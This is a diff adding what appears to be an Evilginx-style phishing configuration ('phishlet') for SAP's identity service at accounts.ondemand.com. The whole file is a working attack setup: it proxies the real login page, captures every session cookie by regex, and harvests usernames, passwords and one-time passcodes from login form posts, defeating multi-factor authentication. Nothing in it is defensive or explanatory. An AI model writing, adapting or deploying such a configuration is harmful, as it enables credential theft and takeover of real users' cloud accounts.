@@ -1,0 +1,34 @@
+name: 'SAP IDP'
+
+min_ver: '3.3.0'
+
+proxy_hosts:
+  - {phish_sub: '<sub>', orig_sub: '<sub>', domain: 'accounts.ondemand.com', session: true, is_landing: true, auto_filter: true}
+
+auth_tokens:
+  - domain: '<sub>.accounts.ondemand.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+
+auth_urls:
+  - '/ui/protected/profilemanagement'
+
+credentials:
+  username:
+    key: '(j_username)'
+    search: '(.*)'
+    type: 'post'
+
+  password:
+    key: '(j_password)'
+    search: '(.*)'
+    type: 'post'
+
+  custom:
+    - key: 'j_otpcode'
+      search: '(.*)'
+      type: 'post'
+
+login:
+  domain: '<sub>.accounts.ondemand.com'
+  path: '/ui/protected/profilemanagement'
